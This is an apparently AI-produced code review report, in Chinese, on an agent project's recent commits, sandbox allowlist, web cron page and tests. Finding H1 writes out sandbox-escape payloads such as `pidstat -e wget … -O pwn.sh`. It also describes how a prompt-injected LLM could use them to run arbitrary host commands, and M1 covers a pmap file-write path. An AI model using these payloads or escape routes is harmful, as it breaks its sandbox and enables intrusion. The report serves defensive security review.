# agent-demo 近期 Commit 评审报告

**评审范围**：e079b8d..3a3ce4a（20 个 commit，66 文件，+3728/-119；1.0.8/1.0.9 双发布周期：上轮 6867995..e079b8d 修复批复核、web「定时」页表单化、只读内存/swap 归因、表情/文件空消息修复、help 分节）+ 未提交变更预审（恢复演练功能：`scripts/drill_restore.py`、`tests/test_drill_restore.py`、`db_backup.py` 重构、文档）
**评审日期**：2026-11-13
**评审方式**：5 个并行子代理分线审查（线1 web定时页+cron面 / 线2 上轮修复批复核 / 线3 消息流水线与适配层 / 线4 沙箱运维技能 / 线5 未提交预审+文档一致性）+ 主代理逐条实证（全量与 PG 套件实跑、ruff/pyright、H1 与 6 个 M 现场复现、CI API 核对、复裁定）
**工作区状态**：**不干净**——BACKLOG.md/README.md/agentcore/backup/db_backup.py/docs/operations.md 修改 + scripts/drill_restore.py、tests/test_drill_restore.py 未跟踪，属进行中的恢复演练功能，已按惯例单独预审（见 §1-M6 及 §1-L11~L14）；实跑数据均为工作区状态口径。

---

## 0. 结论摘要

| 项 | 结论 |
|---|---|
| 最高风险 | **H1**：`run_command` 白名单新增 `pidstat` 未校验参数，sysstat 的 `-e <程序> <参数>` 选项构成任意命令执行——medium（默认）甚至 low 只读档即可逃逸，AGENTS.md「『无任意命令』不变量唯一例外是 high 档 run_shell」被绕过【已复现，主代理亲测】→ **§8.3 阻断发布** |
| 各主题结论 | 线1 web定时页：trusted 提权面/写锁/两段确认(save)扎实，但「默认停用」「两段覆盖面」两处声称失真（M3/M4）+ 非原子编辑（M9）；线2 修复批：上轮 M1–M9 全部真修、FIX 声称无夸大，cross 轮遗留立案不完整（M8）；线3 流水线：回声过滤有一次性误杀窗口（M2）+ help 分节修复不完整（M5）；线4 沙箱：H1 + pmap 写面（M1）；线5 未提交预审：目标库安全设计正确（H 假设证伪），但测试隐式依赖 `data/backups` CI 必红（M6）+ CHANGELOG 漏记 5 项（M7）；另发现存量日期敏感 flake M10（11-10 起必红，下次 push CI 必红） |
| 测试数（主代理实跑，工作区状态） | 默认套件 3994 passed / 83 skipped；PG 全新空库 4091 passed / 1 failed（即 M10）/ 9 skipped；ruff check + format 双绿；pyright 0 errors；RUN_PERF 9 passed 无劣化 |
| CI | `3a3ce4a`（HEAD）双工作流 success，`df0b530` success（GitHub API 实查）【已复现】 |
| 声称核对 | 上轮 FIX「M×9 全修 + L 必修 14 条」与 diff 逐项对上、无夸大；本轮 4 个功能 commit 声称核对见 §1 各条（4034722 两处失真、df0b530 一处文档落差、6518e82 注释/文档失真） |
| 依赖 | 零第三方变化（pyproject 仅自身版本 1.0.7→1.0.9；ruff pin ==0.17.3 三方一致守卫在位）【已复现】 |
| 门禁（§8.3） | **H1 阻断发布**；未提交 drill_restore 功能修 M6 后放行入库；其余 M 不阻断，建议下版前修（见 §6） |

## 1. 已实证的问题

### H1【已复现】pidstat 白名单零参数校验，`-e` 选项 = 任意命令执行（low/medium 档即可逃逸）

- **位置**：`agentcore/workspace/runner.py:243`（`pidstat` 入 `_READONLY_OPS` 免参数集合）、`runner.py:901-903`（集合命中即放行，args 零校验）
- **证据**（主代理亲测，仿真落 `/tmp/opencode`）：
  1. `permitted("pidstat", ["-e","touch","e2e_proof.txt","1","1"], root=…)` → `(True, "")`；`readonly_only=True`（low 档）同样放行；
  2. `CommandRunner(root).run("pidstat", ["-e","touch","e2e_proof.txt","1","1"])` 完整链路真实执行，**工作区内落盘 `e2e_proof.txt` 成功**；
  3. `permitted("pidstat", ["-e","wget","-q","http://…","-O","pwn.sh"])` → 放行（下载+再执行的两阶段链畅通；本机 sysstat 12.6.1 man 明载 `-e program args` = *Execute program with given arguments and monitor it*）；
  4. 对照组：`vmstat -e …` 同样被放行（放行逻辑对所有 A 组命令一致、零校验），但 vmstat 二进制无 `-e` 执行面，故不可利用——**可利用性由 pidstat 的 `-e` 提供**；
  5. 元字符闸、路径遏制均拦不住：payload 无 `|;&><$()` 与换行即过第一道；`wget`/`sh` 裸名 resolve 后仍在工作区下过第二道。
- **影响**：medium 档（默认档）LLM 经 prompt 注入即可获得宿主任意命令执行，且绕过 run_shell 的最小环境/审计口径——与历史 zip `-T -TT` RCE（REVIEW-a604023..679c9b3）同型：白名单声称「只读采样」但命令自带执行面。low 档声称「仅只读」（连 curl 都拒）一并被击穿。
- **修复建议**：从 `_READONLY_OPS` 移除 `pidstat`，或加专属校验器：flag 白名单（`-d -h -I -l -R -r -s -S -t -T -U -u -v -w -C -G -p --dec= --human`）+ **显式拒 `-e`** + 位置参数限 `数字|数字,数字|SELF|ALL`；补负例用例（当前 `TestReadonlyMemoryCommands` 对新进集合命令只有放行断言，负例只有 swapon/cgtop 有——正是漏网结构）；变异复核。

### M1【已复现】pmap 带 rc 文件写面，白名单注释与 AGENTS/docs 三处声称失真

- **位置**：`agentcore/workspace/runner.py:239`（注释「全是只读采样命令，没有写文件/执行代码选项」）、`:246`；`AGENTS.md` 沙箱行「pmap(需数字 pid)」；`docs/features-skills.md:120`
- **证据**（主代理亲测，HOME 指向 /tmp/opencode 沙箱目录）：`HOME=… pmap -n` → 「已成功创建 ~/.pmaprc 文件」并落盘 452 字节 rc 文件；`pmap -N <文件>` 可在工作区新建任意名文件（procps 对已存在文件拒绝写出，实测 victim 原文保留，无覆盖破坏——故未升 H）；`permitted("pmap", ["-N","rcfile","1"])` 连非数字位置参数都放行，AGENTS「需数字 pid」声称不成立。
- **影响**：沙箱 HOME「fs 技能无法写入」的加固假设被打开（该目录是 curlrc/gitconfig 加固锚点）；注释与文档误导后续接手者与 LLM 策略。
- **修复建议**：pmap 加专属校验拒 `-n/-N/--create-rc*/-C/--read-rc*`（或移出白名单——swap/RSS 归因 `proc_detail(sort=rss|swap)` 已覆盖其核心价值）；AGENTS/docs 两处按实改写；补负例。

### M2【已复现】回声过滤存在「同名同大小文件一次性静默误杀」窗口；file_id 兜底语义与 docstring 不符

- **位置**：`agentcore/outbound_files.py:86-95`（name+size 兜底分支）、`plugins/qq_agent_adapter/matcher.py:91-100`（命中即丢弃）、`docs/features-messaging.md`（「用户之后真发同名文件仍会正常处理」）
- **证据**（主代理亲测，内存仿真）：bot 发出 `a.txt(size=3)` 后 6h TTL 内，用户回发**同名同大小**文件（file_id 不同，QQ 转发/重传字节一致的形态）→ `is_recent_sent_file` 判 True，消息被静默吞掉；**第二次重发才放行**（登记已消费）。入站无 `file_size` 时纯文件名命中同样误杀。
- **影响**：「bot 发报告 → 用户把文件发回来说『帮我看看』」的现实场景第一次会被吞且无任何提示（仅一条 info 日志），属静默丢用户消息；文档表述与实现有落差。
- **修复建议**：入站 file_id 与登记 file_id 均存在且不等时不落 name 兜底分支；name 兜底命中时日志区分两种命中来源；补「登记存在+同名同大小」负例用例（现负例用 `other.txt` 不覆盖）；文档改写为如实表述。

### M3【已复现】web「定时」页 trusted 任务「新建即启用」，「默认停用」声称被前端恒传值绕过

- **位置**：`plugins/qq_agent_adapter/cron_web.py:206-211`（后端仅 `enabled is None` 才默认停用）+ `plugins/qq_agent_adapter/web.py:4531-4535`（`cronTrustedChanged()` 只收起/展开 owner 输入框，**不动 crEnabled**）、`:4673`（`cronCollect` 恒传 `enabled: checked("crEnabled")` 布尔，永不为 null）
- **证据**（主代理读码核实全链，线1子代理 normalize 端实跑）：前端新建表单 `f.enabled=true` 初始勾选 → 勾上 trusted 后 `crEnabled` 仍勾着 → payload 恒带 `enabled:true` → 后端 `enabled is None` 分支永不触发。表单 hint「新建时默认停用，需保存后手动启用」与 docs/features-interaction.md 声称在实际表单流程下均不成立——管理员以为要二次启用，实际保存即以超管身份生效。
- **影响**：`/cron add` 的「先停用落盘 → 再显式启用」两步保护（上轮 M7 语义）在 web 通道被绕过；声称与实现不符。
- **修复建议**：`cronTrustedChanged()` 勾选 trusted 时同步取消并禁用 `crEnabled`（或新建时前端不回传 enabled 让后端默认接管）；补「前端 payload + normalize」端到端断言（commit message 声称的「变异复核（trusted 默认停用）」只覆盖了 normalize 的 None 分支）。

### M4【已复现】AGENTS/docs 声称定时页「两段确认 + 审计 + 改前备份」，toggle/delete/run 三个写端点无后端两段确认

- **位置**：`plugins/qq_agent_adapter/web.py:5844`（`/api/cron/toggle`）、`:5861`（`/api/cron/delete`）、`:5883`（`/api/cron/run`）——仅 `Depends(_auth)`，无 `_confirm_token`/`_consume_confirm`；对照 `:5791/:5818` 仅 save 走完整 challenge
- **证据**（主代理读码核实 + AGENTS.md:165 原文「顶层标签：…定时（cron/提醒表单：名称/频率/内容/路由/trusted，写 jobs.json 热加载，**两段确认 + 审计 + 改前备份**）」）。
- **影响**：同页写操作防护口径不一致（对比备份页「删除均两段确认」）；按 AGENTS 声称预期跨页面迁移的管理员会低估启停/删除的误触面。缓解因素：操作者已过 token+2FA+CIDR 会话，toggle/delete 走 `write_lock` 且 `jobs_mod.save` 自带改前备份与回滚、提醒取消与试跑均有审计——故定 M（声称失真）而非 H。
- **修复建议**：给 delete/toggle 补 challenge（与 save 同机制），或把 AGENTS/docs 声称收窄为「保存走两段确认，启停/删除/试跑为会话内直接操作 + 审计」。

### M5【已复现】help 分节修复（59a31cb）不完整：`/reset` superuser-only 仍列「常用」节；「定时提醒」行误导；守卫缺反向锁

- **位置**：`plugins/qq_agent_adapter/help_menu.py:69`（`("/reset", "重置当前会话")` 在常用节）vs `plugins/qq_agent_adapter/admin.py:74-75`（`is_superuser` 拒绝，注释明言「仅 superuser」）；`help_menu.py:87`（「定时提醒：直接说『每天 9 点提醒我喝水』」）vs `agentcore/skills/reminder_skills.py`（reminder_\* 已于 2026-11-02 整体收窄 superuser）
- **证据**（主代理读码核实；线3子代理逐一核对管理节现有 9 条命令全部真 superuser-only）：commit 声称修复「普通用户照菜单打会被拒，菜单等于误导」，但 `/reset` 正是同型残留（handler 收窄与菜单分节脱节）；测试守卫只有单向锁（ADMIN_ONLY 不得出现在普通节），没有反向锁「普通节命令都不是 superuser-only」。
- **修复建议**：`/reset` 移入 ADMIN_ONLY（若产品意图是人人可重置自己会话，则改 handler 放开——需拍板二选一）；「定时提醒」行标注管理员或移除；补 AST 反向锁（同 `TestGuestSkillDrift` 思路）。

### M6【已复现·未提交预审】演练测试隐式依赖 gitignore 运行时产物 `data/backups`，CI 必红（CI #91 教训重演）

- **位置**：`tests/test_drill_restore.py:322-336`（`test_verify_failure_stops_before_scratch` 只 mock 了 `verify_backup`/`_create_scratch`，漏 mock `pick_latest_backup`）
- **证据**（主代理亲测：cwd=仓库根 22 passed / 1 skipped；cwd=/tmp/opencode 无 `data/backups` 等价 CI 全新 checkout → `scripts/drill_restore.py:80` `SystemExit(2)` 未捕获 → **1 failed**）。
- **影响**：入库即 CI 红，并遮挡同 run 的真实信号。
- **修复建议**：该用例补 `tmp_path` + mock `pick_latest_backup`（与同文件 `_patch_happy_path` 口径一致）。

### M7【已复现】CHANGELOG：1.0.9 定稿后 5 项用户可见变更零记录，`[未发布]` 段装着已发布内容

- **位置**：`CHANGELOG.md:77-87`
- **证据**（主代理亲测：`git log 8ecdb05..HEAD -- CHANGELOG.md` 零输出）——`59a31cb`（help 管理员分组）、`6518e82`（内存/swap 归因）、`4034722`（web 定时页 + trusted 修复）、`c6a5a7d`（/cron 剥前缀）、`df0b530`（表情/文件 + 回声过滤）均未进任何段；`## [未发布]` 段现存内容是已随 1.0.9 发布的 REVIEW-6867995 修复批（与 `[1.0.9]` 段重复）。
- **影响**：下版以 `[未发布]` 为底稿会重记 1.0.9、漏记 5 项；历史「CHANGELOG 漏记」模式复发（门禁校验发布段完整性，管不到未发布段内容正确性）。
- **修复建议**：清掉陈旧 `[未发布]` 段、重写为上述 5 项并移回顶部。

### M8【已复现】上轮 cross 轮遗留立案不完整：XM-4/XM-5 悬空；operations.md/CHANGELOG「可 git apply 的 patch」声称未带降级说明

- **位置**：`docs/operations.md:297`、`CHANGELOG.md:104`（「可 `git apply` 的 patch + 文件原文副本」）；`scripts/self_update.py:368`（同句但已带「patch 应用不上时至少能手工拷回」降级说明）；`review/FIX-6867995..e079b8d.md`（通篇只引第一轮，XM 零命中）
- **证据**（主代理 grep 核实）：XM-1/XM-2/XM-3 已在 CHANGELOG 1.0.9「已知待修（下一批）」段立案（显式遗留，合法——**推翻线2子代理「零立案」原判**）；但 XM-4（flock 假阳性偶现竞态 8 跑 2 中）与 XM-5（runtime.patch reset 后不可 git apply，cross 轮已复现）全仓（除 cross 报告本体）零记录，且 operations.md/CHANGELOG 两处的纯「可 git apply」声称与 XM-5 复现结论相悖、未勘误。
- **影响**：接手者按 FIX/BACKLOG 认为上轮闭环，XM-4/XM-5 无去向；patch 声称失真继续存在（self_update docstring 已改口，另两处漏改）。
- **修复建议**：BACKLOG 收编 XM-4/XM-5 并给优先级；operations.md/CHANGELOG 两处补降级说明。

### M9【推演】web 提醒编辑是「先取消后新建」的非原子操作，新建失败即丢旧提醒

- **位置**：`plugins/qq_agent_adapter/cron_web.py:321-327`（`save_reminder`：先 `schedule_cancel(item["id"], user_id=None)` 再 `schedule_add`；主代理读码确认顺序）
- **影响**：【推演】cancel 成功后 add 失败（store 异常/条数上限/DB 抖动）→ 旧提醒已删、新提醒未建，端点 500 后管理员只看到「失败」；jobs 面有改前备份 + verify 回滚兜底，提醒面在 DB 无等价保护，违反「写入功能必须同时补审计 + 改前备份」自设口径（审计有，备份无）。
- **修复建议**：先 `schedule_add` 成功后再 `schedule_cancel` 旧的（失败残留一条旧提醒可重试清理）；异常路径提示「旧提醒已取消、新提醒未建」。

### M10【已复现·存量非本批引入】群统计对账用例日期敏感，自 2026-11-10 起必红（上轮 M-1 同型：固定日历量随 wall clock 漂移）

- **位置**：`tests/test_group_archive.py:23`（`_DAY = dt.date(2026, 10, 6)` 固定日期）vs `agentcore/groupstats/collector.py:47`（`retention_days: int = 35`，`flush()` 末尾 `_maybe_retention()` 删除早于 35 天的桶）
- **证据**（主代理三步复现）：① PG 全量套件该用例稳定失败（`recomputed={'u1':2,'u2':1} == live_map={}`——live 聚合被 retention 清空），基线 worktree（e079b8d 干净树）**同样红**，非本批回归；② 内存路径独立 REPL 复现：固定 ts 2026-10-06 → `user_ranking`/`word_freq` 返回空，近期日期（3 天前）→ 绿；③ 时点对账：CI `3a3ce4a` 于 **11-07** 跑 success（当时距 10-06 仅 32 天 < 35，未越界），越界日 = 11-10，评审日 11-13（38 天）必红——**下一次 push CI Test 步必红**。
- **影响**：CI 门禁被存量 flake 打红并遮挡真实信号；上轮 REVIEW-e55cab5..4d5c1b8 M1（词云 ISO 周奇偶）同型问题复发，说明「测试日期量须相对 today 推导」的教训未沉淀为该文件的习惯。
- **修复建议**：`_DAY` 改为 `today - N 天`（N < retention_days）推导（同上轮 M12「同日用例从本地正午推导」的修法口径）；或该用例显式 `retention_days=10000` 构造 collector 使断言与 wall clock 解耦；补一条「越界形态」负例锁。

### L（14 条，压缩列出）

| # | 位置 | 一句话 | 证据 |
|---|---|---|---|
| L1 | `cron_web.py:196-201` + `web.py:5828-5834` | owner 非法值穿透到 jobs 层触发 `JobsError` 500 裸异常（非 trusted 且 owner 非 QQ 号无预检），数据面已被 verify+回滚兜住 | 已复现（子代理） |
| L2 | `web.py:5829-5830` | `_cron_save` reminder 路径缺 `store is None` 预检（delete 端点有），AttributeError → 500 | 已复现（子代理） |
| L3 | `cron_web.py:375` | 试跑 `create_task` 不保存引用（GC 取消风险，与 cron_admin 同模式非新引入）；试跑 once 任务会跑完即删、trusted 任务以 owner 权限真实执行，均无提示 | 推演 |
| L4 | `tests/test_web.py::TestCronAPI` | 「preview(A)+save(B) 应 400」的换值攻击与 `/api/cron/run` 零用例，核心承诺「所见=所写」无回归锁 | 已复现（机制正确，子代理实跑验证） |
| L5 | `agentcore/loop/engine.py:1683-1699` | M2 修复只盖新写入：存量库 `role=tool` 原文行历史重放仍不过围栏，commit 声称「历史重放不再以原文裸奔」对存量行不成立且未立案（靠窗口滚出自然衰减） | 推演（读码链完整） |
| L6 | `agentcore/outbox.py:35-37` | 注释「uncertain 行下次启动即被消费、不会被挤掉」与 M6 后「通知全失败时保留多轮 + record 触发 500 行截断」漂移，极端场景未认账悬空账可被截断挤掉 | 推演 |
| L7 | `pipeline.py:293-297` vs `:323-333` | 占位显示名与回声匹配名的字段优先级不一致：`{name:"备忘.txt", file:"XYZ_abc.txt"}` 时 LLM 占位显示协议端内部缓存名 | 已复现（子代理） |
| L8 | `tests/test_outbound_files.py:63` | `test_registry_is_bounded` 弱断言（`<= 3` 对 no-op 退化照样绿，应 `== 3`） | 推演 |
| L9 | `runner.py:702-709` | `_systemd_cgtop_ok` 的 `--machine=`（`=` 形态）绕过位置参数检查，与 systemctl 拒 `-M/--machine` 口径不一（信息面，无写/杀面） | 已复现（子代理） |
| L10 | `runner.py:244` | `iostat -f/+f <目录>`（读 sar 数据目录）未在白名单审查清单确认（增量≈0，注释应如实） | 已复现（子代理） |
| L11 | `drill_restore.py:247-249` | 源库连接在 try/finally 外：restore 成功后 `asyncpg.connect(source_url)` 抛异常时 scratch 已留全量副本但不打印清场指引（KeyboardInterrupt 路径同） | 推演 |
| L12 | `tests/test_drill_restore.py:3` + BACKLOG §2.2 | docstring 引用不存在的「文件末注释」，BACKLOG「变异复核 7/7」无清单可查证 | 已复现（子代理） |
| L13 | `drill_restore.py:88,309` + docs/operations.md | 共享 PG 实例上 `DROP … WITH (FORCE)` 踢掉同名库全部连接，挂 timer 与他人验证会话互踩，文档未提示 | 推演 |
| L14 | `drill_restore.py:77-80` + docs/operations.md | 加密备份（`.age`）不参与演练，纯加密部署挂 timer 天天 `SystemExit(2)`，文案不自解释 | 推演 |

**L 批量关闭计划（>10 条，按 §3 收敛规则）**：随同批必修 11 条——L1/L2/L4 随 M3/M4（web 定时页）、L7/L8 随 M2、L9/L10 随 H1/M1（同在 runner.py 白名单）、L11/L12 随 M6（未提交功能入库前）、L13/L14 为 operations.md 一句话；显式遗留 3 条入档——L3（与 cron_admin 同模式，单独小批）、L5（存量围栏回填需权衡成本与误伤，入档「靠窗口滚出衰减」）、L6（随下一批 outbox 触碰时顺手）。

## 2. 被证伪的发现

1. **线2「cross 轮 XM 零处理零立案」——部分推翻（主代理复裁定）**：CHANGELOG 1.0.9「已知待修」段明确立案 XM-1/XM-2/XM-3（显式遗留合法），M8 收窄为「XM-4/XM-5 悬空 + 两处 patch 声称未勘误」。
2. **线1「trusted owner 字段可伪造提权」——证伪**：`trusted=true` 强制 `owner ∈ load_superusers()`（服务端 env，请求方不可控）；runner 放权判据 `if job.trusted and job.owner` fail-closed，伪造 owner 无任何权限消费点。
3. **线1「投递白名单可被表单绕过」——证伪**：表单 target 只放宽到格式校验，群目标执行侧仍过 `_ensure_target_allowed` fail-closed（白名单外零投递）。
4. **线1「challenge 换值攻击可行」——证伪**：`_bound` 是 normalize 后完整字段的 JSON，换 payload 必然 `_consume_confirm` 拒绝（子代理实跑验证；缺的只是回归锁 → L4）。
5. **线2「6803ab6 漏了 capped 出口归还」——证伪**：全局闸拦下时 `return True, None`（无句柄）、细分上限命中时内部已 rollback 后返回 None——capped 出口恒无可归还物。
6. **线2「M2 存围栏版后历史重放双重围栏」——证伪**：`_sanitize_history`/`_project_history` 均不调用 `fence_untrusted`，存围栏版后恰为单次围栏。
7. **线2「drop_uncertain JSON 全等比较假阴致永远删不掉」——证伪**：peek/drop 同走 `_parse` + 规范化序列化；即便假阴方向是保留账目（重复通知一次），非蒸发。
8. **线2「TestSessionOverrideResolution 在 InMemory 下恒真」——证伪**：`run()` 全流程唯一 `resolve_session` 调用点就是 override 分支，变异回事故原形后 `resolved` 为空、两条断言必红。
9. **线3「回声过滤漏网导致自触发循环」——证伪**：漏网回声渲染为「[文件：x]」进一轮引擎，模型回复是文本非文件，不产生新文件回声；代价仅单次多余 LLM 轮次。
10. **线3「纯表情烧完整 LLM 轮次不合理」——判为有意设计**：与纯图片同哲学，并发闸门/回合超时/预算三重兜底。
11. **线3「群文件不判回声是遗漏」——证伪**：群文件回声事件不含唤醒词/@，群聊触发条件天然拦住。
12. **线4「pmap -N 可覆盖既有文件」——证伪**：实测 procps 对已存在 rc 文件拒绝写出（victim 原文保留），写面仅限新建 → M1 未升 H。
13. **线4「system_status swap 项阻塞事件循环」——证伪**：`_swap_summary`/`top_swap_processes` 均走 `to_thread`，技能 superuser-only 不在消息热路径。
14. **线4「swapon 混合参数漏放」——证伪**：`_swapon_ok` 逐项全量校验，任一不在 allowed 即整体拒绝。
15. **线5「drill 可能恢复进生产库」——证伪（H 假设）**：目标库 URL 由 `DATABASE_URL` 仅替换 path 为**固定字面量** `agent_demo_scratch`，DROP/CREATE 库名全部字面量，无「恢复进 DATABASE_URL 库」的代码路径；病态情形（DATABASE_URL 本身叫 agent_demo_scratch）下 DROP 因当前连接占用被 PG 拒绝，fail-loud。
16. **线5「加密备份会被误灌库」——证伪**：`pick_latest_backup` 按 kind 过滤 + `restore_database` 对 `.age` 再拦一道，双层防御。
17. **线5「table_counts 用 pg_stat 估算值对账」——证伪**：视图仅取表清单，行数走逐表精确 `count(*)`。

## 3. 测试与文档状况

**主代理实跑**（工作区状态，含未提交 drill_restore 23 条用例）：
- 默认套件：`pytest -q` → **3994 passed / 83 skipped / 0 failed**（87.4s）
- PG 套件：`qqagent_test` 重建全新空库后全量 → **4091 passed / 1 failed（M10 存量日期敏感 flake，基线同样红）/ 9 skipped**（契约子集先跑 99 passed）
- ruff check + ruff format --check：**双绿**（269 文件）
- pyright agentcore：**0 errors**
- RUN_PERF：`tests/test_perf.py` → **9 passed，无劣化**（未比对 perf_baseline 数值面——本批热路径改动为 tool 结果存库围栏化，perf 用例全绿）
- CI：`3a3ce4a`（HEAD）双工作流 success、`df0b530` success（GitHub API 实查，run created_at 2026-11-07——M10 的越界日 11-10 之前，故绿；**下次 push 将红**）
- BACKLOG DOCS-STATS 计数块（未提交版本 4077 收集 / 3994 通过 / 83 跳过 / 106 文件）与主代理实测**逐字一致**

**声称核对**：
- `FIX-6867995..e079b8d.md`「M×9 全修 + L 必修 14 条」与 8 个修复 commit 逐一对应、变异台账经静态断言敏感性分析 9/9 结构性可红、L 抽 8 项核落码全在——**采信**（线2子代理读码复核）；
- `4034722` 两处失真（M3「默认停用」、M4「两段确认覆盖面」）；`df0b530` 一处文档落差（M2）；`6518e82` 注释/文档失真（M1）；`59a31cb` 修复不完整（M5）；`3a3ce4a`/`646a727` 计数块实测吻合。
- `test_drill_restore.py` 的「变异复核 7/7 必红」不可核查（L12）；BACKLOG「人工演练通过（生产 632MB、8 表差 0 + 指纹一致）」无法在评审中连库核验，不应被下游当作 verified 引用（线5子代理声明）。

**未验证面清单（§8.3）**：
- (a) H1 在部署机 sysstat 老版本（`-e` 引入前）的适用下限——本机 12.6.1 已复现，白名单按部署机实际二进制能力审，任一部署机命中即成立；
- (b) 真机 QQ 通道的表情/文件消息形态（file_id/size 字段的协议端实际取值）——判定逻辑已内存仿真覆盖；
- (c) 线2 各修复的变异复核未重放（采信静态断言敏感性判断；上轮台账在本机）；
- (d) BACKLOG「人工演练通过」的生产 632MB 演练记录（评审不连生产库）；
- (e) M9 提醒编辑非原子的故障注入（推演，未实跑异常路径）。

**门禁结论**：H1 属沙箱逃逸，按 §8.3 **阻断发布/合并**——修复（pidstat 校验或移出白名单）+ 负例回归后方可放行；未提交的 drill_restore 功能修 M6（CI 必红）后可入库，L11–L14 建议同批；M10 在下一次 push 前必须修（CI Test 步必红）；其余 M 不阻断。

## 4. 已验证为「无问题」的关键项

- **web 写面门禁与会话链**：cron 六端点全在 `_write_enabled()` 门内挂载、全带会话鉴权；写面关闭时整页不存在，fail-closed（线1实跑）。
- **trusted ContextVar 放权作用域**：`permission_identity` 仅在 `registry.execute` 包住 handler 期间生效并 finally reset，task 隔离不泄漏；数据身份（user_id/会话键/预算/growth）不变，`cron_trusted_run` 审计在位（test_permissions 实跑）。
- **jobs.json 并发完整性**：save/toggle/delete 全在 M9 写锁内 load→改→save，0600+O_NOFOLLOW 原子写 + 写前备份（10 份）+ 失败回滚 + 写后重读校验（`jobs_verify_failed_rolled_back` 回滚路径实跑复现）。
- **上轮 M1–M9 修复逐条真修**：push 预占出口结算矩阵无遗漏；tool 结果存库围栏版语义等价；自更新归属校验逐段排除 `.bak`/后缀目录、解码兜底、互锁复查点在 `_shutdown_everything` 之后不落假回执；outbox 精确销账漏删方向是保留；一次性 cron 停用在写锁临界区无 await；CHANGELOG 裁段三用例；kb sid 归一双契约锁定；1669b70 session_override 变异可红。
- **AGENTS.md 现状数字**：185 键/可写 115 经 AST 实数吻合；沙箱行新命令清单与 runner 实装一致（内容错误即 M1）。
- **依赖零变化** + ruff pin 三方一致守卫在位；CI HEAD 双 success。
- **drill_restore 目标库安全**（预审 H 假设证伪，见 §2-15/16）；`db_backup.py` 未提交 diff 为纯重构（5 个内联 exclude 提为模块常量，逐项等价，test_migrations 覆盖在）。
- **回声过滤结构与并发面**：仅私聊生效、多文件两步同步无竞态、命中即消费防无限吞、`_MAX_ENTRIES=500`+TTL 有界、日志不记文件名；`file_sender` 的 nonebot 受保护可选导入（§1 唯一豁免）未破坏。
- **容器判定顺序**：`in_container()` 仍走在 `shutil.which` 之前；cgtop 经 `_HINTS` 容器内语义拒绝且文案自解释。

## 5. 与在库报告的衔接复核

| 上轮编号 | 修复状态（本轮复核） |
|---|---|
| REVIEW-6867995..e079b8d M1–M9 | **全部真修落码**（8 个 commit 对准原缺陷位置，回归用例非恒真，FIX 声称无夸大） |
| -cross XM-1/XM-2/XM-3 | 未修，CHANGELOG 1.0.9「已知待修」**显式遗留**（合法立案） |
| -cross XM-4/XM-5 | 未修且**零记录悬空** → 本轮 M8 |
| -cross XL-5（/openclaw import 词边界） | 未修；4034722 的 web 表单绕开了命令面但缺陷仍在（线1证伪为既有 minor，可随下批加 `\b`） |
| -cross 8L（reboot 槽位 AttributeError、flock 假阳性等） | 本轮未逐条复核（不在本批变更面），随 XM 批一并销项 |
| 63f9444..858afcc 遗留 M1/M2 | 上轮报告已销项，本轮无回归迹象 |

## 6. 修复优先级建议

1. **P0（阻断发布）**：H1 pidstat（专属校验 + 负例 + 变异）——同批顺修 M1（pmap）、L9/L10（同文件白名单口径与注释）。
2. **P1（提交/入库前）**：M10（CI 必红，下次 push 即触发；`_DAY` 改相对推导或 collector 显式调 retention）+ M6（drill 测试 mock 补齐）+ L11/L12/L13/L14（同批）+ M7（CHANGELOG [未发布] 段重写，含 5 项变更）。
3. **P2（下版前）**：M3（trusted 默认停用端到端）+ M9（提醒编辑原子性）+ M5（/reset 分节 + 反向锁）+ L1/L2/L4；M4 二选一（补 challenge 或收窄声称）；M2（回声 file_id 兜底收窄 + 负例 + 文档）+ L7/L8。
4. **P3（入档/顺手）**：M8（XM-4/XM-5 入 BACKLOG + 两处 patch 声称勘误）；L3（后台 task 引用 + 试跑提示）；L5/L6 显式遗留入档。

> 归档自检：`python scripts/check_review_docs.py`（归档闸）见 FIX 阶段执行记录。
